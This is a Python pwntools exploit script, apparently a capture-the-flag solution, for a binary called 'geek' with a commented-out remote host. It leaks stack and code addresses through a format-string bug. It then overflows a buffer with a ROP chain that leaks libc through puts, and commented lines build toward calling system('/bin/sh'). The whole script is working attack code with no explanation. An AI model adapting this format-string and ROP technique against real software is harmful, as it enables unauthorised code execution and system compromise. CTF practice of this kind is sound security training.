from pwn import *

def issue(content):
    r.sendlineafter('Gakki-terminal $ ', '5')
    r.send(content)
def commit(content):
    r.sendlineafter('Gakki-terminal $ ', '1')
    r.sendlineafter('Input your code:\n', content)
def view(idx):
    r.sendlineafter('Gakki-terminal $ ', '2')
    r.sendlineafter('Want to view which version?\n', str(idx))

def packAll(rop):
    return flat([p64(x) for x in rop])

# init
r = process('./geek')
#r = remote('35.194.219.218', 8639)
e = ELF('./geek')
libc = e.libc
context.arch = 'amd64'

# leak
commit('%p'*10)
view(0)
#leak = r.recvuntil('1. ')[:-3].split('(nil)')
#code = int(leak[4].split('0x')[4], 16)
leak = r.recvuntil('1. ')[:-3].split('(nil)')
code = int(leak[4].split('0x')[3], 16)
stack = int(leak[2], 16)
code_base = code&0xfffffffffffff000
log.info('stack leak:%#x' % stack)
log.info('code base:%#x' % code_base)

#for i in range(50):
#    print 'AAAA%{}$p'.format(i)
#    commit('AAAA%{}$p'.format(i))
#    view(i+1)
#    print r.recvuntil('1. ')[:-3]
#commit('%1$p%3$p%5$p%7$p%9$p%10$p%11$p%12$p%13$pAAAAAAAAAAAAAAAAAAA')
#view(1)

prdi = code_base+0x0000000000000ef3# : pop rdi ; ret
prsi = code_base+0x0000000000000ef1# : pop rsi ; pop r15 ; ret
self_read = code_base+0xa4a

# 
rop = []
rop += [prdi, code_base+e.got['exit']]
rop += [code_base+e.plt['puts']]
rop += [code_base+0xD1A]
issue('A'*0x18+packAll(rop))
exit = u64(r.recv(6)+'\x00\x00')
libc_base = exit -libc.symbols['exit']
log.info('libc base: %#x' % libc_base)

#sh = libc_base + libc.search('/bin/sh\x00').next()
#system = libc_base + libc.symbols['system']
#rop = []
#rop += [prdi, system]
#rop += [code_base+e.plt['puts']]
#rop += []
#raw_input('>>')
#issue('A'*0x18+packAll(rop))

r.interactive()
